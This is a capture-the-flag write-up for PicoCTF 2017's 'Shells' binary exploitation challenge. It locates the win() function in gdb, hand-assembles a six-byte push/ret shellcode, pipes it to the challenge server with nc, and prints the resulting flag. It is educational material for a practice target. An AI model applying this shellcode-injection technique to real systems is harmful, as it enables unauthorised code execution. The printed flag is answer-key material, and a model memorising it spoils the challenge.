# PicoCTF 2017- Level 2 - Binary Exploitation 2

**Title:** Shells  
**Category:** Binary Exploitation  
**Points:** 70  
**Description:**

>How much can a couple bytes do? Use [shells](shells)! [Source](shells.c). Connect on shell2017.picoctf.com:17533.  

**Hint:**

>Read about basic shellcode  
>You don't need a full shell (yet...), just enough to get the flag  

## Solution

This problem is more complex than the previous one. By openning the source file we see that we can only submit 10 bytes of data, which is not enough to contain a shell.  
But, looking at the source we can also see the function:
```C
void win(){  
    system("/bin/cat ./flag.txt");  
}  
```

So our job here is to create code to call the function `win()` that will give us the flag. First, let's start gdb:
> $ gdb  
> (gdb) file ./shells  

Now that our programs is loaded in gdb, let's find the address of the `win()` function:

>(gdb) info functions  
>All defined functions:  
>  
>Non-debugging symbols:  
>0x08048378  _init  
>0x080483b0  read@plt  
>0x080483c0  printf@plt  
>0x080483d0  fflush@plt  
>0x080483e0  puts@plt  
>0x080483f0  system@plt  
>0x08048400  __gmon_start__@plt  
>0x08048410  exit@plt  
>0x08048420  mmap@plt  
>0x08048430  __libc_start_main@plt  
>0x08048440  _start  
>0x08048470  __x86.get_pc_thunk.bx  
>0x08048480  deregister_tm_clones  
>0x080484b0  register_tm_clones  
>0x080484f0  __do_global_dtors_aux  
>0x08048510  frame_dummy  
>0x08048540  win  
>0x08048560  vuln  
>0x08048610  main  
>0x08048670  __libc_csu_init  
>[...]  

We can see that the win function is at the address `0x08048540`. So our shell code will look like this:
> \x68               |  push  
> \x40\x85\x04\x08   |  win()  
> \xc3               |  ret  

Now let's create the shellcode:  
>$ python -c "print('\x68\x40\x85\x04\x08\xc3')" > shellcode  
>$ cat shellcode - | nc shell2017.picoctf.com 17533
>My mother told me to never accept things from strangers  
>How bad could running a couple bytes be though?  
>Give me 10 bytes:  
>4350d27b024f8597f10b98f164f0fc43  

Thus the flag for this one is `4350d27b024f8597f10b98f164f0fc43`